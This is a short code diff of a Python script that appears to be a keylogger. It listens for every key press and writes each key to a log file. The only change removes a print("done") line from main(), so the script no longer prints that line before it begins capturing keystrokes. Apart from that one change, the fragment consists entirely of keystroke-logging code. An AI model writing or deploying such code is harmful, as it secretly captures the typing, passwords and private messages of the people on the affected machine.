@@ -5,7 +5,6 @@ def keyPressed(key):
         logkey.write(str(key) + '\n')
 
 def main():
-    print("done")
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
     listener.join()
